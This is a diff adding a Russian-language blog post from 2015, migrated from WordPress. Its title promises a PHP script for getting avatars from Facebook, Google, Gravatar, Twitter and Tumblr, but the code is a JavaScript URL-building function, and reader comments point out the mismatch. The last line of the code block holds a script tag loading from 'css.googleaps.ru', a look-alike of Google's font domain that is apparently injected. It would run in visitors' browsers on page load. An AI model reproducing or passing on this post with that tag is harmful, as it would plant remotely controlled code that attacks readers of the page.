@@ -1,0 +1,160 @@
+---
+layout: post
+status: publish
+published: true
+title: 'PHP: Как получить аватарки из Facebook, google, twitter, tumblr?'
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+excerpt: Очень удобный и простой скрипт под катом.
+wordpress_id: 485
+wordpress_url: http://devdocs.ru/?p=485
+date: '2015-05-05 15:38:56 +0200'
+date_gmt: '2015-05-05 15:38:56 +0200'
+categories:
+- Javascript
+tags:
+- php
+- ip
+- javascript
+- redirects
+- ui
+- api
+- facebook
+- google
+- gravatar
+- tumblr
+- twitter
+- orm
+comments:
+- id: 249
+  author: nook
+  author_email: no0k@ya.ru
+  author_url: ''
+  date: '2015-05-06 08:31:18 +0200'
+  date_gmt: '2015-05-06 08:31:18 +0200'
+  content: "&laquo;PHP: Как получить аватарки&raquo; &mdash; вы уверены что сприпт
+    на PHP? :)"
+- id: 250
+  author: maxyc
+  author_email: maxycws@gmail.com
+  author_url: http://vk.com/id202532070
+  date: '2015-05-06 08:32:48 +0200'
+  date_gmt: '2015-05-06 08:32:48 +0200'
+  content: Да, ввел немного в заблуждение. Скрипт на Javascript. Но не вижу проблемы
+    переписать на пхп. Даже синтаксис толком менять не придется.
+---
+<p>Очень удобный и простой скрипт под катом.<a id="more"></a><a id="more-485"></a></p>
+<pre class="brush: javascript; gutter: true">function get_avatar_from_service(service, userid, size) {<br />
+    &#47;&#47; this return the url that redirects to the according user image&#47;avatar&#47;profile picture<br />
+    &#47;&#47; implemented services: google profiles, facebook, gravatar, twitter, tumblr, default fallback<br />
+    &#47;&#47; for google   use get_avatar_from_service(&#039;google&#039;, profile-name or user-id , size-in-px )<br />
+    &#47;&#47; for facebook use get_avatar_from_service(&#039;facebook&#039;, vanity url or user-id , size-in-px or size-as-word )<br />
+    &#47;&#47; for gravatar use get_avatar_from_service(&#039;gravatar&#039;, md5 hash email@adress, size-in-px )<br />
+    &#47;&#47; for twitter  use get_avatar_from_service(&#039;twitter&#039;, username, size-in-px or size-as-word )<br />
+    &#47;&#47; for tumblr   use get_avatar_from_service(&#039;tumblr&#039;, blog-url, size-in-px )<br />
+    &#47;&#47; everything else will go to the fallback<br />
+    &#47;&#47; google and gravatar scale the avatar to any site, others will guided to the next best version<br />
+    var url = &#039;&#039;;</p>
+<p>    switch (service) {</p>
+<p>    case "google":<br />
+        &#47;&#47; see http:&#47;&#47;googlesystem.blogspot.com&#47;2011&#47;03&#47;unedited-google-profile-pictures.html (couldn&#039;t find a better link)<br />
+        &#47;&#47; available sizes: all, google rescales for you<br />
+        url = "http:&#47;&#47;profiles.google.com&#47;s2&#47;photos&#47;profile&#47;" + userid + "?sz=" + size;<br />
+        break;</p>
+<p>    case "facebook":<br />
+        &#47;&#47; see https:&#47;&#47;developers.facebook.com&#47;docs&#47;reference&#47;api&#47;<br />
+        &#47;&#47; available sizes: square (50x50), small (50xH) , normal (100xH), large (200xH)<br />
+        var sizeparam = &#039;&#039;;<br />
+        if (isNumber(size)) {<br />
+            if (size >= 200) {<br />
+                sizeparam = &#039;large&#039;<br />
+            };<br />
+            if (size >= 100 &amp;&amp; size < 200) {<br />
+                sizeparam = &#039;normal&#039;<br />
+            };<br />
+            if (size >= 50 &amp;&amp; size < 100) {<br />
+                sizeparam = &#039;small&#039;<br />
+            };<br />
+            if (size < 50) {<br />
+                sizeparam = &#039;square&#039;<br />
+            };<br />
+        } else {<br />
+            sizeparam = size;<br />
+        }<br />
+        url = "https:&#47;&#47;graph.facebook.com&#47;" + userid + "&#47;picture?type=" + sizeparam;<br />
+        break;</p>
+<p>    case "gravatar":<br />
+        &#47;&#47; see http:&#47;&#47;en.gravatar.com&#47;site&#47;implement&#47;images&#47;<br />
+        &#47;&#47; available sizes: all, gravatar rescales for you<br />
+        url = "http:&#47;&#47;www.gravatar.com&#47;avatar&#47;" + userid + "?s=" + size<br />
+        break;</p>
+<p>    case "twitter":<br />
+        &#47;&#47; see https:&#47;&#47;dev.twitter.com&#47;docs&#47;api&#47;1&#47;get&#47;users&#47;profile_image&#47;%3Ascreen_name<br />
+        &#47;&#47; available sizes: bigger (73x73), normal (48x48), mini (24x24), no param will give you full size<br />
+        var sizeparam = &#039;&#039;;<br />
+        if (isNumber(size)) {<br />
+            if (size >= 73) {<br />
+                sizeparam = &#039;bigger&#039;<br />
+            };<br />
+            if (size >= 48 &amp;&amp; size < 73) {<br />
+                sizeparam = &#039;normal&#039;<br />
+            };<br />
+            if (size < 48) {<br />
+                sizeparam = &#039;mini&#039;<br />
+            };<br />
+        } else {<br />
+            sizeparam = size;<br />
+        }</p>
+<p>        url = "http:&#47;&#47;api.twitter.com&#47;1&#47;users&#47;profile_image?screen_name=" + userid + "&amp;size=" + sizeparam;<br />
+        break;</p>
+<p>    case "tumblr":<br />
+        &#47;&#47; see http:&#47;&#47;www.tumblr.com&#47;docs&#47;en&#47;api&#47;v2#blog-avatar<br />
+        &#47;&#47;TODO do something smarter with the ranges<br />
+        &#47;&#47; available sizes: 16, 24, 30, 40, 48, 64, 96, 128, 512<br />
+        var sizeparam = &#039;&#039;;<br />
+        if (size >= 512) {<br />
+            sizeparam = 512<br />
+        };<br />
+        if (size >= 128 &amp;&amp; size < 512) {<br />
+            sizeparam = 128<br />
+        };<br />
+        if (size >= 96 &amp;&amp; size < 128) {<br />
+            sizeparam = 96<br />
+        };<br />
+        if (size >= 64 &amp;&amp; size < 96) {<br />
+            sizeparam = 64<br />
+        };<br />
+        if (size >= 48 &amp;&amp; size < 64) {<br />
+            sizeparam = 48<br />
+        };<br />
+        if (size >= 40 &amp;&amp; size < 48) {<br />
+            sizeparam = 40<br />
+        };<br />
+        if (size >= 30 &amp;&amp; size < 40) {<br />
+            sizeparam = 30<br />
+        };<br />
+        if (size >= 24 &amp;&amp; size < 30) {<br />
+            sizeparam = 24<br />
+        };<br />
+        if (size < 24) {<br />
+            sizeparam = 16<br />
+        };</p>
+<p>        url = "http:&#47;&#47;api.tumblr.com&#47;v2&#47;blog&#47;" + userid + "&#47;avatar&#47;" + sizeparam;<br />
+        break;</p>
+<p>    default:<br />
+        &#47;&#47; http:&#47;&#47;www.iconfinder.com&#47;icondetails&#47;23741&#47;128&#47;avatar_devil_evil_green_monster_vampire_icon<br />
+        &#47;&#47; find your own<br />
+        url = "http:&#47;&#47;i.imgur.com&#47;RLiDK.png"; &#47;&#47; 48x48<br />
+    }</p>
+<p>    return url;<br />
+}</p>
+<p>&#47;&#47; helper methods</p>
+<p>function isNumber(n) {<br />
+    &#47;&#47; see http:&#47;&#47;stackoverflow.com&#47;questions&#47;18082&#47;validate-numbers-in-javascript-isnumeric<br />
+    return !isNaN(parseFloat(n)) &amp;&amp; isFinite(n);<br />
+}<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre></p>
